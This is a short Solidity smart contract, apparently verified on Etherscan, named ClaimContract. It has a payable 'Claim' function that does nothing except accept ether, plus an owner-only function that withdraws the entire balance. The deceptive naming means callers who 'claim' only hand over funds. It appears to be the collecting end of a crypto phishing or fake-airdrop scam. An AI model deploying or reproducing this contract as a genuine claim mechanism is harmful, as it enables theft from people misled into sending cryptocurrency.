/**
 *Submitted for verification at Etherscan.io on 2023-07-20
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

contract ClaimContract {

    address private  owner;

    constructor() {
        owner = msg.sender;
    }

    function withdraw() public {
        require(owner == msg.sender, "Access Denied");
        payable(msg.sender).transfer(address(this).balance);
    }

    function Claim() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}